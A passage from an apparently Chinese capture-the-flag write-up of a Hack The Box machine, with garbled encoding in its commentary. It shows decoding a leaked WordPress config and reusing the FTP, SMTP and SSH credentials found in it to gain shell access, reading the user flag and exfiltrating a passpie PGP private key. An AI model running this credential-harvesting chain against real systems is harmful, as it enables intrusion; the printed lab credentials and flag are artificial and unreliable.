Closing\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# echo PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==|base64 -d\n<?php\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'blog' );\n\n/** MySQL database username */\ndefine( 'DB_USER', 'blog' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8mb4' );\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n\ndefine( 'FS_METHOD', 'ftpext' );\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\ndefine( 'FTP_HOST', 'ftp.metapress.htb' );\ndefine( 'FTP_BASE', 'blog/' );\ndefine( 'FTP_SSL', false );\n\n/**#@+\n * Authentication Unique Keys and Salts.\n * @since 2.6.0\n */\ndefine( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );\ndefine( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );\ndefine( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );\ndefine( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );\ndefine( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );\ndefine( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );\ndefine( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );\ndefine( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );\n\n/**\n * WordPress Database Table prefix.\n */\n$table_prefix = 'wp_';\n\n/**\n * For developers: WordPress debugging mode.\n * @link https://wordpress.org/support/article/debugging-in-wordpress/\n */\ndefine( 'WP_DEBUG', false );\n\n/** Absolute path to the WordPress directory. */\nif ( ! defined( 'ABSPATH' ) ) {\n        define( 'ABSPATH', __DIR__ . '/' );\n}\n\n/** Sets up WordPress vars and included files. */\nrequire_once ABSPATH . 'wp-settings.php';\n```\n```bash\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\n```\næˆ‘ä»¬å¾—åˆ°äº† ftp çš„ç™»é™†è´¦å·å’Œå¯†ç \n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ftp 10.10.11.186\nConnected to 10.10.11.186.\n220 ProFTPD Server (Debian) [::ffff:10.10.11.186]\nName (10.10.11.186:root): metapress.htb\n331 Password required for metapress.htb\nPassword: \n230 User metapress.htb logged in\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||1913|)\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog\ndrwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer\n226 Transfer complete\nftp> cd mailer\n250 CWD command successful\nftp> ls\n229 Entering Extended Passive Mode (|||27331|)\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer\n-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php\n226 Transfer complete\nftp> get send_email.php\nlocal: send_email.php remote: send_email.php\n229 Entering Extended Passive Mode (|||3114|)\n150 Opening BINARY mode data connection for send_email.php (1126 bytes)\n100% |**********************************************************************************************************************************************************************|  1126        5.45 MiB/s    00:00 ETA\n226 Transfer complete\n1126 bytes received in 00:00 (4.08 KiB/s)\n```\nè¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ª send\\_email.php æ–‡ä»¶ï¼Œç„¶åä¸‹è½½ä¸‹æ¥äº†\n\n```php\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# cat send_email.php \n<?php\n/*\n * This script will be used to send an email to all our users when ready for launch\n*/\n\nuse PHPMailer\\PHPMailer\\PHPMailer;\nuse PHPMailer\\PHPMailer\\SMTP;\nuse PHPMailer\\PHPMailer\\Exception;\n\nrequire 'PHPMailer/src/Exception.php';\nrequire 'PHPMailer/src/PHPMailer.php';\nrequire 'PHPMailer/src/SMTP.php';\n\n$mail = new PHPMailer(true);\n\n$mail->SMTPDebug = 3;                               \n$mail->isSMTP();            \n\n$mail->Host = \"mail.metapress.htb\";\n$mail->SMTPAuth = true;                          \n$mail->Username = \"jnelson@metapress.htb\";                 \n$mail->Password = \"Cb4_JmWM8zUZWMu@Ys\";                           \n$mail->SMTPSecure = \"tls\";                           \n$mail->Port = 587;                                   \n\n$mail->From = \"jnelson@metapress.htb\";\n$mail->FromName = \"James Nelson\";\n\n$mail->addAddress(\"info@metapress.htb\");\n\n$mail->isHTML(true);\n\n$mail->Subject = \"Startup\";\n$mail->Body = \"<i>We just started our new blog metapress.htb!</i>\";\n\ntry {\n    $mail->send();\n    echo \"Message has been sent successfully\";\n} catch (Exception $e) {\n    echo \"Mailer Error: \" . $mail->ErrorInfo;\n}\n```\n```bash\n$mail->Username = \"jnelson@metapress.htb\";                 \n$mail->Password = \"Cb4_JmWM8zUZWMu@Ys\";  \n```\nå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è´¦æˆ·åœ¨ä¹‹å‰çš„ /etc/passwd ä¸­æœ‰å‡ºç°ï¼Œå¹¶ä¸”æ˜¯æœ‰ /bin/bash æƒé™çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ª ssh è´¦æˆ·\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh jnelson@10.10.11.186\nThe authenticity of host '10.10.11.186 (10.10.11.186)' can't be established.\nED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.186' (ED25519) to the list of known hosts.\njnelson@10.10.11.186's password: \nLinux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Dec 31 18:52:04 2022 from 10.10.14.96\njnelson@meta2:~$ whoami&&id\njnelson\nuid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)\n```\næˆåŠŸæ‹¿åˆ° user æƒé™\n\n```bash\njnelson@meta2:~$ cat user.txt \nbfe452b37100243ff838f397eac125e9\n```\næˆåŠŸæ‹¿åˆ° user\n\næƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\njnelson@meta2:~$ ls -la\ntotal 32\ndrwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .\ndrwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..\nlrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null\n-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout\n-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc\ndrwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local\ndr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie\n-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile\n-rw-r----- 1 root    jnelson   33 Dec 31 19:18 user.txt\n```\n```bash\njnelson@meta2:~/.passpie/ssh$ ls -la\ntotal 16\ndr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 .\ndr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 ..\n-r-xr-x--- 1 jnelson jnelson  683 Oct 25 12:52 jnelson.pass\n-r-xr-x--- 1 jnelson jnelson  673 Oct 25 12:52 root.pass\n```\nåœ¨ç›®å½• /home/jnelson/.passpie/ssh ä¸‹æœ‰ä¸€ä¸ª root.passï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å†…å®¹\n\n```bash\njnelson@meta2:~/.passpie/ssh$ cat root.pass \ncomment: ''\nfullname: root@ssh\nlogin: root\nmodified: 2022-06-26 08:58:15.621572\nname: ssh\npassword: '-----BEGIN PGP MESSAGE-----\n\n\n  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2\n\n  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km\n\n  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED\n\n  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf\n\n  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg\n\n  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw\n\n  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr\n\n  lpF0RatbxQGWBks5F3o=\n\n  =uh1B\n\n  -----END PGP MESSAGE-----\n\n  '\n```\nç„¶åè¿˜æœ‰ä¸€ä¸ª .keys æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®ï¼Œå°†å®ƒä¸‹è½½åˆ°æœ¬åœ°\n\n```bash\nscp jnelson@10.10.11.186:.passpie/.keys keys\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# cat .keys         \n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\n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\nfo6KI+w2uXLaw+bIT1XZurDN\n=dqsF\n-----END PGP PUBLIC KEY BLOCK-----\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n\n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\n=7Uo6\n-----END PGP PRIVATE KEY BLOCK-----\n```\nç„¶åæˆ‘åˆ é™¤äº† .keys ä¸­çš„ public å¯†é’¥\n\n```bash\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n\nlQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1\nAiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD\n/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho\n3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT\nZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV\ngNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX\n5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp\ntQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb\na1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG\nWIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw\n8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh\ncODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML\nqIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j\nFJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH\nFqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE\nPnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM\nFKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L\n/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y\nq2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+\nF2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh\nS8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM\nRfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu\nTDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20\noFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4\nV9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n\nWP4HAwKQfLVcyzeqrf8h02o0Q7OLrTXfDw4sd/a56XWRGGeGJgkRXzAqPQGWrsDC\n6/eahMAwMFbfkhyWXlifgtfdcQme2XSUCNWtF6RCEAbYm0nAtDNQYXNzcGllIChB\ndXRvLWdlbmVyYXRlZCBieSBQYXNzcGllKSA8cGFzc3BpZUBsb2NhbD6IkAQTEQgA\nOBYhBHxnhqdWG8hPUEhnHjh3dcNXRdIDBQJiuFfWAhsjBQsJCAcCBhUKCQgLAgQW\nAgMBAh4BAheAAAoJEDh3dcNXRdIDRFQA/3V6S3ad2W9c1fq62+X7TcuCaKWkDk4e\nqalFZ3bhSFVIAP4qI7yXjBXZU4+Rd+gZKp77UNFdqcCyhGl1GpAJyyERDZ0BX